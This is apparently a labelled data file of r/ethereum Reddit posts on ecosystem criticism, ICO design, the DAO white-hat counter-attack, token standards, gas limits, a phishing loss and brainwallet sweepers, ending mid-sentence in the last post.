after reading tuur's criticisms [here](https://twitter.com/tuurdemeester/status/1078682801954799617) and discussion about it [here](https://www.reddit.com/r/ethereum/comments/aac4hr/tuurs_criticism_discussion_thread/) i decided to write my own list of criticisms. 1) in 2017, during the height of the ico mania, many prominent voices in ethereum were not vociferously outspoken against the hysteria that occurred, and their unwillingness to do so likely lead to the increased prominence of scams/malicious entities operating in or around the space. 2) the ethereum foundation and most other teams working on scaling solutions have done a terrible job of creating educational material or funding people/orgs to create educational material meant for laypersons. 3) the time-table of research/development of core scaling solutions has been, and continues to be, unclear. i understand that research is still being conducted, but it's not hard to keep a road-map updated. 4) apathy on topics (especially related to new eth issuance and the new presence of asic miners) by those with influence has led to the loudest voices being the most-visible in conversations/discussions, which discourages constructive discussion. 5) large organizations operating in the space have been negligent in helping with the adoption of technologies operating on top of ethereum (namely ens). 6) the cost of operating a full node on ethereum is something that is being overlooked. this is being worked on through research into state rent and client improvements. this needs to be a bigger priority though. 7) projects operating in ethereum have done a poor job of internationalizing software and funding distribution to areas where it could be useful to people that need it. this doesn’t extend to all projects, but as a whole we’ve done a poor job of this. 8) a fixation on wealth generation has led to centralization of funds which could have been better-deployed to early-stage startups, or public infrastructure/tools. 9) most projects operating on ethereum with the goal of becoming a business have neglected making a self-sustaining business model, resulting in orgs that require perpetual grants. 10) most projects seem to have written off a usable-ux in favor of complaining about how decentralization is hard. 11) the average person with interests in cryptocurrency is too focused on the increase of their own wealth. this is not what this technology is for. **what are your constructive criticisms of ethereum/the ethereum ecosystem at this point?**	0

i've written up a poc for [an offchain auction-based contract](https://gist.github.com/arachnid/b9886ef91d5b47c31d2e3c8022eeea27), to start a conversation on better ways to do icos. the way it would work is: 1. the crowdsale authors deploy the contract and announce the end date. 2. users deposit funds with the contract. funds are held until after the end of the crowdsale. 3. users sign a message with a bid price and quantity, and send this privately to the crowdsale authors. 4. once the crowdsale is over, the authors set a strike price (about which more below). they also publish all the signed bids, to demonstrate they acted fairly in setting the strike price. 5. after the strike price is set, either crowdsale authors or bidders can submit their signed bid in order to buy tokens at the strike price (assuming the bid was at least at that price), or to withdraw their deposit if their bid was too low. 6. a week after the end of the crowdsale, anyone can withdraw their deposit unconditionally. the strike price is calculated offchain by the crowdsale authors. the exact price isn't determined by consensus, but because the contract won't allow them to take in more than the declared amount of ether, or sell more than the declared number of tokens, the economically efficient result is for them to set the price as expected - to the highest price that brings in the fundraising amount they requested. this contract is written around a 'capped' model, so the total amount raised is fixed; higher bids mean that the sellers have to give away fewer tokens in return for the funding they requested. an uncapped model would be a fairly trivial modification. thoughts?	1
https://projectethereum.com/ wow, where do i begin with this?!?! so i ran across a facebook page promoting this project ethereum page. it's a classic ponzi scheme where you pay ether to the members above you, and then you have to recruit more members, etc. this obviously has nothing to do with the ethereum platform, as it's not a dapp or ico, just simply a couple of con artist trying to get over. what's sickening is that they claim to actually care about the third world and being humanitarian. i think they are trying to get church organizations involved as well. fortunately, if this ponzi grows big it will inflate the value of eth...unfortunately a lot of people will get screwed....	2

"i hope that i'll be able to write down a more complete blog post at some point, because the full story would make a fascinating read, but right now here's are the main points: since friday i've been in contact with a group of very smart people with the intent on replicating the attack to avoid any more of the ether being bled. let's call this group, collectively ""robin hood"". everyone in this group acted as an individual and did not represent or received the endorsements of their employers. robin had been able to replicate the attack on the testnet but couldn't be sure it would work until it was tested. first it would require the group to successfully stalk and infiltrate multiple split proposals that were open. after some initial setbacks the group was able to infiltrate all open split proposals and trying to identify the best one to execute. the best candidate proposal ended up being [#78](http://etherscan.io/token/thedao-proposal/78) because it didn't have many stalkers and we had identified the curator. we control 3 of the 5 accounts that split with us, if you have any information on who are the other accounts, please contact us so we are able protect the funds. the group was diverse in their opinions on the fork(s). some are very strongly anti-any-fork, some are very strong pro-fork and everything in between. despite our differences, we identified an imminent attack we worked together to prevent it. for that reason everyone was also reticent on doing the white hat attack as it could be bad for the recovery efforts on the past hacks. also, even those in the group that supported the soft fork could agree that we had no idea how long it would take to implement and deploy one. today about 19h central european time robin detected that there was a new attack going on. it was draining slowly, a few ether per round, but it had already amassed a few thousand dollars. it seemed to be someone testing the waters and seeing if it could drain more. having our hands forced, the group decided to go forwards with the attack. i donated 100k dao tokens to the process with the full knowledge that it could be burned in the process. the more tokens the robin contract had, the faster it could syphon the ether to protect it. the attacker picked up the pace and other attackers joined in. some of the most efficient hackers were able to do up to 30 recursions with up to 200 ether moved in each, so it became clear that if we didn't do anything the dao would be drained before anything could have been done. we contacted some ""whales"" who were happy to donate to the effort and we were able to secure about 6m dao tokens. we made it clear to everyone that we were not sure they would be able to recover these tokens, but these generous friends were happy to contribute to the effort. thanks to this we were able to outpace the attacker, doing 4,000 and then at up to 40,000 ether per round, totaling up30 rounds of recursions. all these attacks [can be studied on the blockchain]( http://etherscan.io/txsinternal?zero=true&a=0xbb9bc244d798123fde783fcc1c72d3bb8c189413&valid). this is the [child dao of the robin hood attack]( https://etherscan.io/address/0xb136707642a4ea12fb4bae820f03d2562ebff487). these three child daos were the ones in which a concurrent attack drained ether: [84ef](http://etherscan.io/address/0x84ef4b2357079cd7a7c69fd7a37cd0609a679106), [f4c6](http://etherscan.io/address/0xf4c64518ea10f995918a454158c6b61407ea345c) and [aeeb]( http://etherscan.io/address/0xaeeb8ff27288bdabc0fa5ebb731b6f409507516c). we know nothing about them and if any of these are parallel white hat attacks then this is the right time to come forward. if you happen to be the curator of any of these child daos, or happened to have split with them into one of them, please come forward as well do come forward as well as you can help with this effort. there might be others. ### what now? 7.2m ethers from the dao are now held in a child dao and we hold the private keys of the curator. it's important to identify the other 2 - but the risk has been reduced from 20 thousand attackers down to only 2. as soon as that dao matures, we will try to move all the funds in a refund contract, that will be much simpler than the dao was. of course we still need to be very careful with that code and to analyze it for any possible exploit. if you own the addresses **0xb97ba16dfafa8fc5824c029f0653cc03a1796e99** or **0xe1e278e5e6bbe00b2a41d49b60853bf6791ab614** please come forward. there is a lot of unaccounted ether, on the main attacker dao and other copycat attacks. if you are the curator in any of them, you might be very useful. if you are the hacker, then all i can say is we are coming for you. there are many [plans in place to attack the child daos and either block the funds or recover them](https://blog.slock.it/a-dao-counter-attack-613548408dd7). ### what about forks? i've made my opinion clear many times about my opposition to a hard fork that breaks code or balance immutability, so i don't think this is the place to discuss it. the child daos are also vulnerable to the same kinds of attacks so it's important to identify everyone else on the same child dao as the main whitehat. there are very valid points for a limited, voluntary, temporary software upgrade in which miners will be able to prevent other attacks like this from happening, and they may be used to prevent further attacks on these child daos. we now hope we bought enough time to stay calm and rational about these. ### what about what's left in the dao? there are still plans to retrieve the remainder of the dao and i can't discuss it further. but most of the ether is now more secure and there are some interesting advantages on having some money left [which will allow the dao itself to buy tokens into the bad splits and attack them to recover or block the ether](https://blog.slock.it/a-dao-counter-attack-613548408dd7#.sthdgppgx)."	2
"if you've been to ethereum for more than 5 minutes, you've heard the phrase erc20, to refer to ethereum tokens. erc stands for ethereum request for comments and it's nothing more than a topic on the main ethereum improvement proposals github, that help multiple main developers debate definitions of improvements, future forks and contract standards. contract standards are one of the most important thing in ethereum: the reason so many projects can issue a token that can be used in other wallets, or exchanged via decentralized exchanges or really used for anything else, is that they all use a set of same standards, basically a ""balanceof"" call that tells you how many tokens you have and a ""transfer"" function that tells you to transfer these tokens from me to you. token standard has been one of the first proposed standards and were talked about and debated by multiple users until finally formally written down by /u/feindura/ which also implemented it in ethereum wallet, first wallet to adopt it. what are the main issues with the current erc20? many. the first glaring one is how to transfer tokens to contracts. because you can send tokens to any ethereum address, you can easily also send them to contracts which do not support them, locking them forever. worse than that: even if the tokens can be manually moved, it's very hard to tell which tokens came from who, and try sending them back. to solve that, the erc20 used to have a **approve** function that would allow you to approve the transfer to a contract and then you needed to create a second transaction, letting the contract know you had approved it. this required two transactions, had multiple security issues and was not widely implemented. multiple token standard have been proposed since erc20, to solve that famously erc223 and the ""aproveandcall"" standards. others have been tried to augment the functionality of tokens by allowing off chain signing to transfer without needing ether, or private transfers that use zksnarks or ring signatures to add privacy to tokens. none had much momentum, but erc777 seems to be getting it, because it implememts all in a more elegant way: https://github.com/ethereum/eips/issues/777 #### backwards compatible making your token erc777 compatible will make it compatible with more important functions of erc20 (and you can implement the rest and make it fully compatible) #### safer and simpler send to contract introduces a new transfer function that adds a third field called bytes where you can add any identifying information to the transfer and it automatically lets the receiving contract that the transfer occurred, so it can do something automatically #### sets decimals to default 18 this a controversial move: many people feel that it was a mistake to add custom decimals to erc20. the idea being that its not very useful to add lower limits on the divisibly of your token (and it doesn't make sense to add more thann 18) and adding custom decimals make writing offline wallets like trezor, harder. erc777 doesn't remove the decimals, but defaults it to 18. #### adds approved operators the idea is that you give a contract the right to move tokens in your behalf, which means that you can build contracts that enhance your token, independent of the token needing to implement it. want to add anonymity? authorize a mixer contract as an approved operator. worried about backups? add an emergency recovery service that can move all your tokens out if you lose your keys. people can improve your tokens, years after they were created. this allows the contract full access to the contracts, so any sort of limitation (like daily limits based on exchange rate) needs to be built in the token itself. ### what else? the standard is not finalized, and that's where you come in. make your opinion known, what do you like or dislike about it? what would you want changed differently? next time you meet someone building a new token, ask them about their opinion on this standard."	1
thanks to increased adoption, and lately cryptokitties, ethereum is once again running into the gas limit. miners need to up the gas limit again so we can continue to capture growth instead of sending development and interest elsewhere. letting a fee market develop is devastating to the utility of the evm and will have serious long term consequences if allowed to happen this early in history (just look how almost all development/investment left bitcoin for ethereum). we are still too far away from pos + sharding to sit back and do nothing. please bring awareness to this issue before it is too late! the gas fee market can be observed here at ethgasstation.info and you will see that sub 1 gwei fees are no longer adequate most of the time. unfortunately, this is only the beginning.	2

**tldr; if you want to publicly announce your love for your so, your hate for capitalism, your plan for world domination or your frustration with installing arch linux, you can do it here. a website will display your message for all the world to see, if only you pay more than the guy before you** https://putyourfuckingtextonthefuckingblockchain.com/ hi guys, so for the last couple of ~~months~~ days i've been working on an ethereum smart contract thingy. it's a small little project and i'd like to hear your opinion. the idea is roughly as follows. i like money. so i created a smart contract which stores your message forever on the blockchain (in the form of a string) if you make a transaction which has a higher value than the previous one. i also made a website which displays the latest string in a super large font and bolded letters for all the world to see. there is a javascript script running on it which enables you to instantly pay and submit your message (using metamask). there is another script running which displays the message on the actual blockchain. i'm a super noob at solidity and i welcome all feedback! it's all open source and available for you to scrutiny. i crossposted this to r/ethdev as well! i hope more and more small cool projects will be built on ethereum and i'd like to hear your opinion! edit: so i created a twitter acc which will contain all the previous messages! enjoy :) https://twitter.com/textblockchain edit: [what have i done.](https://twitter.com/textblockchain/status/961522531520958464)	2

this is so simple it will shock you. set a higher `targetgaslimit`. let me explain why this is a good idea. recently the network has been having trouble handling peak traffic from icos. a lot of people seem to agree that the network could handle higher throughput. it's widely been proposed that the way to do this is for miners who are currently implementing a cap to stop doing that, resulting in what the client software will do by default: the limit gets voted up when usage is close to capacity. so far has this hasn't really worked in practice. part of the problem is that not everyone has been willing or able to change their settings, so a minority of miners continue to vote the limit down even when the network is close to capacity. but another problem is that the adjustment algorithm is quite timid. it will vote the limit down if the previous block is empty, or if the previous block has a small number of transactions. these are quite common behaviours by miners trying to minimize their orphan risk, and they're unlikely to change them, no matter how much we yell at them. it would be possible to modify the software to tweak the automatic adjustment to be more aggressive, for example by targeting blocks that are half-full instead of two-thirds-full. but the automated adjustment doesn't seem like a great fit for the current situation anyhow. to see why, think about why do we have a block gas limit. * prevent dos * protect the ability to run nodes * prevent big miners using a propagation advantage if the automated adjustment was working, it would fail at these things. if a dos attacker finds a new way to attack the network, they can either fill up the blocks for a while to grow it, or wait for a peak from an ico. worse, since the adaptive limit takes a bit of time to adapt, they can create a (albeit short-lived) backlog at will. the adaptive limit has no idea whether people's geth nodes are falling over, unless things are getting so bad that mining nodes are stopping. if it was working, and the demand was there, it would simply supply it. preventing big miners using a propagation advantage is about the idea that miners with large share would use the fact that they don't have to propagate to themselves to mine blocks with lots of low-value transactions that aren't competitive for anyone else. but in practice, we're currently seeing the opposite: it's the big miners who are charging high fees and mining blocks without many transactions in them. there may be some useful strategies that can be automated, like targeting a particular uncle rate. but what we've got wouldn't be what we need even if it was working, which it isn't, so it's better to do it manually for a while. stop waiting for the adaptive thing to kick in. if you think the network can handle more capacity, just vote the peak capacity limit up, regardless of usage. something like: `geth --targetgaslimit 8000000` `parity --gas-floor-target 8000000 --gas-cap 10000000`	0

ethereum wallet has this great feature called sync with ligh client network. this gives you a functional working program (so no webbrowser needed) that can interact with the ethereum network, while only downloading about 1 gb of data. this is essential for most people on this planet, as they don't have very fancy and expensive hardware. however recently there have been bugs in the latest version of geth leading to a very unstable light mode network. there are not enough peers available to serve everybody and this leads to possible new peers never getting connected, if they would they would be able to help other light mode users. so the light mode network is getting starved. please developers, fix the bugs that lead to bad connectivity. and users here, you can help by running a ethereum wallet in light mode so there will be more light nodes available. also parity developers please make a light mode version for your wallet that is compatible so that users from both wallets can get connected to each other. there is such great opportunity for ethereum to actually get the user adoption that bitcoin sold out on. the community is alive, the developers are united, the network is stable, transactions are fast and cheap. so please fix these bugs and let's get that light mode network working properly it will help people like me that might not currently have the resources to store 20 gb of data but are smart enough they want to interact with the ethereum network without having to use a webbrowser. (always keep business and pleasure separated) i want to user ethereum more and more for payments but right now when i go online, i have to leave my laptop connected to the internet for about 20 hours just to get enough connectivity with other light mode peers to download a couple 100 mb of extra block headers. and because of a bug sometimes the lighchain get corrupted and it can take 30 - 40 hours for me to get 1 gb of lightchain data, while if i download something over bittorrent at 500 kb/s it only takes 33 minutes to download 1 gb. we need more lighserve nodes!!!!!! the demand is currently very very high. edit: so the problem is that the latest protocol update has made peer discovery less reliable, and this hits harder in lightmode because there are less lightserve nodes, probablly because the lightserve option is off by default when you run geth (because lightmode is still experimental). on github i have seen people advise to run geth 1.7.2 instead of 1.7.3 but i can't confirm for myself it that is a good fix. on linux, after geth is running, you can launch ethereum wallet and it will see geth is running. if you just launch ethereum wallet i think it opens it internally or something and since the last update i think it is using geth 1.7.3.	2
"mastering ethereum just completed the copy-edit process. it's in final production and heading to distribution by the end of november. pre-order copies will start shipping from amazon around the end of november, new orders by dec 10th. the book is twice as long as originally planned (400+ pages from 200). it has some gaps, due to the constant changing nature and sprawling breadth of ethereum as a topic, but we'll have to address those in a second edition. overall, i'm very happy with the result and i hope it serves to help thousands of developers get started and learn how to ""master"" ethereum. it's been a huge effort with enormous support from the community. contributions on github were facilitated by two github editors who volunteered to project manage, review, edit, merge, and approve pull requests and issues: * lead github editor: francisco javier rojas garcia (fjrojasgarcia) * assisting github editor: william binns (wbnns) apart from myself and gavin, here's the list of contributors to the first edition: * abhishek shandilya (abhishandy) * adam zaremba (zaremba) * adrian li (adrianmcli) * adrian manning (agemanning) * alejandro santander (ajsantander) * alejo salles (fiiiu) * alex manuskin (amanusk) * alex van de sande (alexvandesande) * anthony lusardi (pyskell) * assaf yossifoff (assafy) * ben kaufman (ben-kaufman) * bok khoo (bokkypoobah) * brandon arvanaghi (arvanaghi) * brian ethier (dbe) * bryant eisenbach (fubuloubu) * chanan sack (chanan-sack) * chris remus (chris-remus) * christopher gondek (christophergondek) * cornell blockchain (cornellblockchain) - alex frolov (sashafrolov) - brian guo (brianguo) - brian leffew (bleffew99) - giancarlo pacenza (gpacenza) - lucas switzer (lucasswitz) - ohad koronyo (ohadh123) - richard sun (richardsfc) * cory solovewicz (corysolovewicz) * dan shields (nukemandan) * daniel jiang (wizardofaus) * daniel mcclure (danielmcclure) * daniel peterson (danrpts) * denis milicevic (d-nice) * dennis zasnicoff (zasnicoff) * diego h. gurpegui (diegogurpegui) * dimitris tsapakidis (dimitris-t) * enrico cambiaso (auino) * ersin bayraktar (ersinbyrktr) * flash sheridan (flashsheridan) * franco daniel berdun (fmercury) * harry moreno (morenoh149) * hon lau (masterlook) * hudson jameson (souptacular) * iuri matias (iurimatias) * ivan molto (ivanmolto) * jacques dafflon (jacquesd) * jason hill (denifednu) * javier rojas (fjrojasgarcia) * joel gugger (guggerjoel) * jon ramvi (ramvi) * jonathan velando (rigzba21) * jules lainé (fakje) * karolin siebert (karolinkas) * kevin carter (kcar1) * krzysztof nowak (krzysztof) * lane rettig (lrettig) * leo arias (elopio) * liang ma (liangma) * luke schoen (ltfschoen) * marcelo creimer (mcreimer) * martin berger (drmartinberger) * masi dawoud (mazewoods) * matthew sedaghatfar (sedaghatfar) * michael freeman (stefek99) * miguel baizan (mbaiigl) * mike pumphrey (bmmpxf) * mobin hosseini (indicat0r) * nagesh subrahmanyam (chainhead) * nichanan kesonpat (nichanank) * nick johnson (arachnid) * omar boukli-hacene (oboukli) * paulo trezentos (paulotrezentos) * pet3rpan (pet3r-pan) * pierre-jean subervie (pjsub) * pong cheecharern (pongch) * qiao wang (qiaowang26) * raul andres garcia (manilabay) * roger häusermann (haurog) * solomon victorino (bitsol) * steve klise (sklise) * sylvain tissier (sylti) * taylor masterson (tjmasterson) * tim nugent (timnugent) * timothy mccallum (tpmccallum) * tomoya ishizaki (zaq1tomo) * vignesh karthikeyan (meshugah) * will binns (wbnns) * xavier lavayssière (xalava) * yash bhutwala (yashbhutwala) * yeramin santana (ysfdev) * zhen wang (zmxv) * ztz (zt2) a huge thanks is owed to all those who helped and all those who patiently waited for their pre-order copies over a 1 year delay. print copies are on amazon: https://www.amazon.com/mastering-ethereum-building-smart-contracts/dp/1491971940 ebook and broader distribution to other booksellers will follow. the source code is on github (ethereumbook/ethereumbook), under a cc-by-nc-nd license (free to read and share but does not allow commercial use or derivatives like pdfs or translations). within the first year from publication we will open the license to cc-by-sa allowing derivatives (most importantly: open translations) and commercial re-use with open licenses. andreas"	1
"i often see to be a lot of misinformation around there being no ""real"" applications running on the live ethereum chain. not only are there hundreds (if not thousands) of projects starting up left and right, there are also major corporations starting to launch their own dapps. here is a list i've started but i'm sure there are more, so feel free to share in the comments. axa, one of the world's largest insurance companies with ~$100bn in annual revenue is building [fizzy](https://group.axa.com/en/newsroom/news/axa-goes-blockchain-with-fizzy), which offers insurance against delayed flights. kik, a messaging platform that has 15 million monthly users is building [kin](https://kin.kik.com/papers/kin_whitepaper_v1_english.pdf), a decentralized ecosystem of digital services. younow has 40 million registered users and is building [props](https://www.propsproject.com/static/props%20whitepaper.pdf), a decentralized ecosystem of video applications. kaspersky lab just announced a project called [polys](https://bitcoinmagazine.com/articles/kaspersky-lab-and-parity-technologies-launch-blockchain-based-voting-system/) which is a blockchain based voting system. coinbase is building [toshi](https://www.toshi.org) which is a browser for the ethereum network looking to bring in the masses. brave browser (founded by brendan eich) has built and launched [bat](https://basicattentiontoken.org), a blockchain based digital advertising platform. larva labs, responsible for the androidify marketing campaign for google, built [cryptopunks](https://www.larvalabs.com/cryptopunks), a project related to digital art on the blockchain."	0
what i see btc lacking is mostly utility, and on top of that the transactions themselves often do not represent what btc is supposed to be, eg cheap and quick to use. on the other hand eth seems to be building a platform for application while at the same time having a token. one can argue, it’s utility can be a reason for having some form of intrinsic value derived from it. discuss.	1
i understand the majority is here ~~for profit~~ because of ether, the token, which is a decentralized currency like bitcoin. but let's not forget that is just a minor party of ethereum. in the long term, i believe more people will realize ethereum is not just a token, it is a decentralized computer. one that will run fully autonomous social networks, companies and even governments. ethereum is, for all we know, the current winner for a race towards ~~skynet~~ ~~singularity~~ a whole new thing with consequences we don't even understand. this post may or may not be related to me being annoyed about the importance you give for things like sec, that won't exist for nearly as long as ethereum will.	1
in response to [this thread](https://www.reddit.com/r/ethereum/comments/arr7c6/leadership_should_be_held_accountable_to_the/) about holding ethereum leadership accountable i'd like to use this thread to answer questions from those who are concerned that those in leadership positions may have ulterior motives, conflicts of interest, etc. you can also ask me other things. i will only speak on behalf of myself and my beliefs/opinions. nothing i answer in this thread represents the views of the ethereum foundation or other organizations i'm affiliated with. we should work on our issues together.	1
first off, i'd like to thank everyone who worked with me yesterday to help me with the loss of my btc and eth. i learned a lot through conversations with many of you and i can't thank you guys enough. in the wake of all this madness, a kind redditor reached out to me in a private message offering to reimburse the eth i had lost, so long as i beefed up my own security. we exchanged back and forth for a while, discussing better security measures and new options for storing my coins. he was kind of enough to share his own knowledge and experience with me and i was happy to listen. whether or not he intended to actually help me recover my losses, and to what extent, was somewhat unimportant as i obviously had much to learn. ultimately, he generously gifted me nearly **all** of the money i had lost. i was blown away to say the least and don't ever recall a stranger showing me so much kindness. i'd like to publicly thank this redditor (who has asked that he remain anonymous for good reason) for not only gifting me the coins i lost, but for educating me while restoring just a bit of my faith in humanity. something i think we'll all pretty short on these days. this experience has shown that everyone is prone to error and that you can never be too careful. but it has also shown me that every once in a while, strangers tend to show some kindness to others. additionally, it has reaffirmed my belief that it is always the best course of action to admit fault in an attempt to learn from your experience. pretending you did nothing wrong *only makes things worse.* i intend to build upon this experience and sincerely hope that i can do the same thing for someone, someday. i am very excited about the cryptocurrency space as a whole and fully plan on becoming as involved as possible. however, without the help of the community, i would have been totally lost. now, i can take this experience and share it with others to prevent future things like this from happening. that being said, if anyone who comes across this thread is curious about btg (bitcoingold) please be extremely careful about your information. **never** give out your personal seed for your wallet! i know that should be obvious but anyone can be fooled. thanks again everyone, you've all been a huge help! also, shoutout to /u/jprichardson (exodus co-founder) for showing up and helping figure out the source of the hack. **tl;dr**: i lost a significant amount of money in a hack and a kind redditor reimbursed me for my losses. edit: this is for those who are asking how the attack was carried out and what mistakes i made. (mostly copy pasta from the other thread) > while it makes me feel like a dumbass, i did attempt to check mybtgwallet as i was curious about btg and wanted to know if there was any to claim etc. initially, i went to https://bitcoingold.org and saw their address check box, after inputting my address, i seem to recall there being a link to https://mybtgwallet.com/ underneath the box. so, i clicked on it and was brought to the site, but as i was extremely hesitant to give out any of my information, i tried to assure myself it was legit. it displayed a valid ssl certificate at the time of my visiting so i decided i would proceed. unfortunately, this makes it pretty clear that it was all my fault. i'm embarrassed to say the least, and certainly heartbroken at my losses. i guess i'm a little new and didn't think much of it when i was asked for my seed, looking back that's pretty fucking stupid, there's no reason they my seed right? but the valid ssl had me fooled. i will surely never do something so stupid again and will take steps to increase security on my own. however, i do think btg and mybtgwallet should take some blame for this as they are not ensuring the security of their users/potential users but ultimately this is clearly my fault. /u/jprichardson expands more on in detail as to how this happened here: https://www.reddit.com/r/ethereum/comments/7d7sq8/all_my_ethereum_stolen_right_out_of_my_wallet/dpwphw5/ as for safer practices. i've ordered a hardware wallet and plan to store all of my coins on there from now on. in the meantime, i've enabled 2fa on just about everything i own. (email, facebook, etc.) i moved all of my coins off of my desktop as many of you have recommended; as they apparently exhibit more vulnerabilities than other options. i've also locked away all of my keys in a much safer, password-protected place, but plan to move all of those offline as soon as my new wallet arrives. i've also reset my google chrome settings, deleted any saved passwords that might carry over to anything important, and cleared cookies, history etc. as well as changed all of my passwords to make them much more secure. as for advice from the anonymous donor. here are some of the things he shared with me. * he advised that even with a hardware wallet, malware can intercept transactions and change the destination address before it goes into your wallet, so exercise extreme caution when making transactions and try and make them from a *clean* system ~~is~~ if you have access to one. * exercise caution if you are a miner and try not to store any of your coins on said mining rig as they can be easy targets for malware. if possible, use separate machines for trading, storing, and mining. another option for this is to create a virtual machine where software is segregated -or- even consider swapping out hdds (possibly one with linux instead of windows) to to trading operations. * double check that the address has not been changed in your clipboard by pasting it elsewhere before initiating your transactions. * minimize the amount of software on the computer you are doing your trading on to reduce risk of infection. in addition, use a clean browser with no extensions (except for metamask which apparently protects against phishing attacks). thanks everyone for reading. sorry for the wall of text. **tl;dr 2**: i stupidly gave out my 12-word recovery seed to site that appeared safe.	2

the actual bottleneck is the i/o pressure on the miners hard disks (hdd or ssd). it takes to much time to create a new 8 million gas block because of the evm database handling. this particular bottleneck probably could be addressed with a better db or the introduction of some kind of stateless client (eip648). but.... we have to be prepared to face a long very high fee period with a record uncle rate numbers.	0
[https://casinofair.com/](https://casinofair.com/) this is a relatively major step in the journey toward mass adoption. and they're being responsible citizens of the eth ecosystem by using their proprietary implementation of state channels so they get low latency,negligible fees and are not gonna clog the network by committing every single gameplay interaction on the blockchain as a tx.	1
that so many people want to use cryptokitties and, thus, use the ethereum network to buy, sell and give birth to cats is not so surprising, seeing the previous pepe cards, beanie baby, pokemon crazes. this is currently putting a stress on ethereum and testing its limits (yet we're far from them as gas limits can easily be increased with agreement from miners). we know scability is one of the most important issues for public blockchains (if not the most important). it's not easy to have real transactions to test a public blockchain, people don't use it just for the sake of it. so cryptokitties is heaven for preparing the network to other more important (though less furry and cute) applications. welcome cryptokitties for a better, faster and more awesome ethereum!	2
"please, read this and try to understand this. it does not matter whether constantinople comes six weeks earlier or later. proof-of-stake, sharding, and everything else that is involved in the serenity milestone will happen whenever it is ready. the teams researching and building on the 2nd iteration of ethereum are independently working on ethereum 2.0 and proof-of-stake will not be delayed because we postpone a protocol upgrade on the legacy chain. furthermore, it's important to understand that proof-of-stake, the so-called ""phase 0"" / the ""beacon chain,"" will not be a hardfork, unlike other milestones. we will see beacon chain testnets very soon, within weeks or months. and i expect that we can reach the serenity milestone within a year, optimistically speaking. but please, understand that this is pretty much detached to what is happening on the current network (or what's not happening)."	2
"is there anyone interested in creating a useful tutorial for programming in solidity, for absolute noobs in programming in general. i have never spent enough time in any programming language in the past (yes, i did some basic on c64 and the first steps writing a ""hello world"" following the steps from a tutorial). but other interests just drawed too much attention. choices needed to be made. but now i'm interested in programming in solidity, but all tutorials start from a minimum knowledge in programming in general. a tutorial that focusses purely on the evm and ignores any need for other luggage from past experiences would be great, imo. i even think if such a tutorial is very good, it would blow the practical potential of the evm and the (true) value of eth & ethereum."	2
i know reddit is the worst possible place to judge true sentiment around a topic but as we're all aware, this sub has been toxic lately. i've been around the crypto space for about 4 years now and i left the bitcoin community about 2 years ago because of the constant obsession with price. i felt that it really stunted any growth or innovation in the community, people just wanting to get rich off the idea and not progress. that eventually led me here due to the drive of the community to come together and make game changing ideas come to life. the reality is, as a lot seem stuck on debating price and hashing power, hundreds of great dapp ideas are being worked on right now. august will be a great month for some of these apps to launch and the future is incredibly bright. just watching the consensys intern hackathon and following a lot of the top devs on twitter will make you realize all of the great work going on behind the scenes. don’t be influenced by trolls who are trying to make you lose confidence. the reality is we are very close to having some of our first dapps with the potential to go mainstream. quit worrying about price and hash rate, that’s not why we’re here.	0

hey everyone! if you've been around this subreddit for a while you've seen us before. we've been training developers on ethereum for 4 years now! **we've just launched our first [community education programme](https://blockstars.b9lab.com) at goerlicon [together with the department of decentralisation](https://medium.com/ethberlin/building-blocks-dod-and-b9lab-for-blockchain-education-729b41320fc1), the team behind ethberlin!** b9lab is committing to co-sponsor up to 500 free seats to students and we are looking for organisations and individuals from the community to help us fund the other half. so for every seat sponsored we provide another one for free. every seat is 999dai, the contribution address is available on [blockstars.b9lab.com](https://blockstars.b9lab.com). we've got sponsorship packages, hit me up if your organisation want to support this project and be involved in the student channels, workshops etc. the programme is aimed at people who are already developers, regardless of circumstances and background, but have not been able to learn about ethereum yet. developers apply and go through a simple screening test. applications are open now and will run through february. on the 1st of march we will select the best students and invite them to the learning platform. the number obviously depends on how many seats we can raise dai for. the course itself is online and self-paced, a mix of text, images, videos, screencasts and animations. students do coding exercises and our mentors provide code review and feedback. mentors also stand by to answer questions and guide students through tough spots. we're covering blockchain basics, in-depth solidity, evm, deployment, web3 and truffle. but we also want to make the course fun and colourful so if you would like to organise a talk, remote workshop, local learning group or similar, please ping me. so, we are looking for sponsors and collaborators to make this happen! looking forward to working with you guys to make this happen. i'll try to answer any questions asap :)	1

"this month: * microraiden. achieves instantly and without fees **thousands of transactions per second.** this first version is for ethereum tokens, which makes trivial the transfer of eth too (see explanation 1 at the end of the post). * casper test network. casper is the next version of ethereum, where everyone can be a ""miner"" and earn money, because ethereum abandons the electricity-wasting mining invented by bitcoin. with casper, being a miner means staking eth in the network and offering a very little bit of computer power. miner's money is left intact and (s)he is rewarded if (s)he does a good job. the security does not arise from energy wasting computations, but because any attempt to cheat the security will be penalised by the network (eth removed from the stake). **it means that people are incited to accumulate eth now and hold once casper is alive.** the more you buy now that the price is cheap, the more you can earn later. in 2018: * eth futures. **futures trading is coming** before june 2018, as announced by bloomberg a few days ago. * upgrade of the network, with an intermediary version before casper, based on hybrid security : traditional miners will still be able to mine, and **stakers will also be allowed**, as described above. later, casper will be fully deployed, only staking will be possible. * more than 200 companies (such as intel, microsoft, jp morgan, ing, bank of america, ubs, mastercard, ...) are part of the **enterprise ethereum alliance**. they started to develop almost one year ago and the first outcomes might be released. 1: it allows for creating a decentralised system (contract) which receives your eth budget, then convert your payments to tokens, transfers them through microraiden, and your recipient withdraws the corresponding eths when the channel is closed."	1

for the last couple weeks i've been following some accounts that have a bunch of old brainwallet keys and compete with each other to steal ether that is continually deposited into accounts, either via mistake or misconfiguration. i've seen them mentioned once or twice, usually by /u/rya_nc in regards to the empty password parity account: https://etherscan.io/address/0x00a329c0648769a73afac7f9381e08fb43dbea72 there's not a ton of information about this practice out there, but much of it is related to btc rather than eth, but i've heard them referred to as sweepers as they sweep deposited funds out of accounts as fast as they can. you can see in the brainwallet for '' (as in no password) that a few different accounts compete for the funds that are deposited here. one of the common addresses you can find is [0x957cd4ff9b3894fc78b5134a8dc72b032ffbc464](https://etherscan.io/address/0x957cd4ff9b3894fc78b5134a8dc72b032ffbc464) which i'll refer to here as 957. now, 957 has been quite lucrative in this endeavor, collecting something like $23m in ethereum and $900k in tokens over two years. not too unusual up until this point, plenty of sweepers do the same thing (most not nearly to the same success rate) and make a good amount of cash stealing from people who make mistakes. but all this competition between sweepers leads to some interesting situations like in the case of this empty password brainwallet account, which has a supply of $13k worth of minereum tokens and a private key that anyone can look up. [minereum (mne) erc20 token tracker](https://etherscan.io/token/0x1a95b271b0535d15fa49932daba31ba612b52946?a=0x00a329c0648769a73afac7f9381e08fb43dbea72) however, since any transactions to this account are quickly swept away, it's impossible to send enough gas for a 